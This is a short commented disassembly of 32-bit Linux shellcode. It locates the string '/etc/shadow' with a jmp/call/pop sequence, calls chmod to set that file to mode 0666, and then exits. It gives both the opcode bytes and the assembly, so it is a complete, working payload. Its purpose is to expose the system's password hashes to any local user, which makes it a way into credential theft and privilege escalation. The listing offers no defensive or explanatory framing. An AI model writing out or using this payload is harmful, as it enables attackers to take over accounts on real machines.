
0:  eb 17                   jmp    0x19 ; jump to the end of the shellcode and push the address of the string using call
2:  5e                      pop    esi ; put the address of the string in esi
3:  31 c9                   xor    ecx,ecx
5:  88 4e 0b                mov    BYTE PTR [esi+0xb],cl ; zero the last byte (null byte)
8:  8d 1e                   lea    ebx,[esi]
a:  66 b9 b6 01             mov    cx,0x1b6
e:  31 c0                   xor    eax,eax
10: b0 0f                   mov    al,0xf
12: cd 80                   int    0x80 ; call chmod
14: 31 c0                   xor    eax,eax
16: 40                      inc    eax
17: cd 80                   int    0x80 ; call exit
19: e8 e4 ff ff ff          call   0x2
; /etc/shadow